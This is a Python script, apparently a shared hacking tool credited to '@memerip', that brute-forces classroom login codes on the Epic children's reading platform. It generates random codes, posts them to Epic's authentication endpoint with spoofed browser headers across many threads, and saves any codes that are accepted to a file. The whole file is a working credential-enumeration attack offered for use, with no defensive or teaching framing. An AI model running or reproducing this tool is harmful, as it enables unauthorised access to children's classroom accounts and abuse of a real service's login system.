import requests
import random
import string
import threading
import json

#Get epic api
url = "https://auth.getepic.com/api/v1/auth/code"

headers = {
    "Content-Type": "application/json; charset=UTF-8",
    "Origin": "https://kids.getepic.com",
    "Referer": "https://kids.getepic.com/e2c-classcode-login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Ep-Dev": "Web",
    "X-Ep-Device-Id": "b9d45608a85b1af03b9abfa64bfc2f0f",
    "X-Ep-Source": "1212",
    "X-Ep-Version": "121",
    "X-Flagsmith-Auth": "1",
    "X-Ep-Tz-Offset-Min": "300",
    "X-Ep-Locale": "US-en",
    "X-Ep-Os": "MacOS",
    "Sec-CH-UA": '"Chromium";v="131", "Not_A Brand";v="24"',
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Priority": "u=1, i"
}

lock = threading.Lock()
generated_codes = []

def generate_random_code():
    letters = string.ascii_lowercase
    digits = string.digits
    return ''.join(random.choice(letters) for _ in range(3)) + ''.join(random.choice(digits) for _ in range(4))

def check_code(code):
    payload = {
        "accountLoginCode": code,
        "loginCode": code
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        message = data.get("message", {})

        if "invalid_classroom_code" in json.dumps(message):
            print(f"Class Code '{code}' - ❌ Invalid")
        else:
            print(f"Class Code '{code}' - ✅ Valid")
            with open("working.txt", "a") as f:
                f.write(f"{code}\n")

    except Exception as e:
        print(f"Error decoding response for code {code}: {e}")
        print("Raw Response:", response.text)

def thread_worker(limit):
    while True:
        with lock:
            if len(generated_codes) >= limit:
                break
            code = generate_random_code()
            if code in generated_codes:
                continue
            generated_codes.append(code
            )
        check_code(code)

def main():
    print("""
   ______     __     ______      _     
  / ____/__  / /_   / ____/___  (_)____
 / / __/ _ \/ __/  / __/ / __ \/ / ___/
/ /_/ /  __/ /_   / /___/ /_/ / / /__  
\____/\___/\__/  /_____/ .___/_/\___/  
                      /_/              

Made by @memerip | Discord Server https://discord.gg/CKQuGPqx8M                                                               
    """)

    try:
        total = int(input("Enter total number of class codes to generate: "))
        threads_count = int(input("Enter number of threads to use: "))
    except ValueError:
        print("Invalid input. Please enter integers.")
        return

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=thread_worker, args=(total,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"\n✅ Finished checking {total} codes.")

if __name__ == "__main__":
    main()
